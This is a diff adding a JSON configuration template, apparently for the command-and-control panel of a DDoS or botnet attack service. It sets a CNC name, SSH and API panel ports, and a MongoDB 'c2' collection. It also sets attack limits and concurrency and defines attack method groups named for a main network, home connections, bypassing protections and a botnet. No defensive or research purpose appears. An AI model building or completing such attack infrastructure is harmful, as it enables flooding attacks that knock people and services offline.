@@ -1,0 +1,56 @@
+{
+  "owner_name": "",
+  "cnc_name": "",
+  "banner_message": "",
+  "spinnertype": "",
+  "key": "",
+  "api": 
+  {
+    "enabled": true,
+    "port": 443,
+    "cert_path": "",
+    "key_path": ""
+  },
+  "ssh": 
+  {
+    "enabled": true,
+    "captcha_enabled": true,
+    "port": 1337
+  },
+  "mongo_url": "mongodb://User:pass@IP:27017/?authSource=admin",
+  "mongo_db_name": "Services",
+  "mongo_db_collection": "c2",
+  "max_attacks": 25,
+  "max_concurrents": 25,
+  "attack_logs": true,
+  "attack_settings": 
+  {
+    "method_groups": 
+    [
+      {
+        "name": "main_network",
+        "max_slots": 4,
+        "cooldown": 0,
+        "custom_role_name": "main_network"
+      },
+      {
+        "name": "home_holder",
+        "max_slots": 20,
+        "cooldown": 0,
+        "custom_role_name": "home_holder"
+      },
+      {
+        "name": "bypass_network",
+        "max_slots": 1,
+        "cooldown": 0,
+        "custom_role_name": "bypass_network"
+      },
+      {
+        "name": "botnet_network",
+        "max_slots": 1,
+        "cooldown": 60,
+        "custom_role_name": "botnet_network"
+      }
+    ]
+  }
+}
